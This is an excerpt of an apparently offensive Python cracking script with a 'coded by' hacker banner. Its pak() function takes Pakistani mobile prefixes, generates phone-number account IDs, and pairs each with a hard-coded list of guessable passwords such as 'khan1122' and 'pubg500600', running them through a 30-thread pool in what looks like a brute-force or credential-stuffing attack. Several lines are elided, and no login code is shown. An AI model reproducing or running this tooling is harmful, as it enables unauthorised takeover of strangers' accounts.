...
\033[1;92m YMMMM9    YMMMM9  _MM_   YM._MMMMMMMMM _MM_    \M\_
     ...
     ┌───────────────────────────────────────┐
     │ [💸] 𝑪𝑶𝑫𝑬𝑫 𝑩𝒀 : 𝑺𝑯𝑨𝑯𝑰 𝑱𝑶𝑲𝑬𝑹 𝑲𝑯𝑨𝑵𝑶𝑶           │
     │ [💸] 𝑮𝑰𝑻𝑯𝑼𝑩   : 𝑯𝑨𝑱𝑰 𝑱𝑶𝑲𝑬𝑹 𝑯𝑨𝑪𝑲𝑬𝑹                │
     │ [💸] 𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷 : 𝑵𝑶 𝑾𝑯𝑨𝑻𝑺𝑨𝑷𝑷      │
     │ [💸] 𝑽𝑬𝑹𝑺𝑰𝑶𝑵  : 𝑨.3                   │
     │ [💸] 𝑯𝑨𝑪𝑲𝑬𝑫   : \033[1;32m𝑴𝑹 𝑺𝑯𝑨𝑯𝑰 𝑱𝑶𝑲𝑬𝑹\033[1;37m              │
     └───────────────────────────────────────┘""")
def linex():
	print(50*'_')
def clear():
...
def pak():
		user=[]
		clear()
		print('\033[1;35m Code example: 079,070,078,0335,0345')
		...
		with tred(max_workers=30) as 🄹🄾🄺🄴🅁:	
			...
			for psx in user:
				ids = code+psx
				if pcs in ['1','01']:
					passlist = [psx,ids,'khankhan','khan1122','Afghanistan12345','khanbaba','100200','khan12345','500600','khankhan12345','khanArman','1020304050','pubg500600','pubg1122']
				if pcs in ['2','02']:
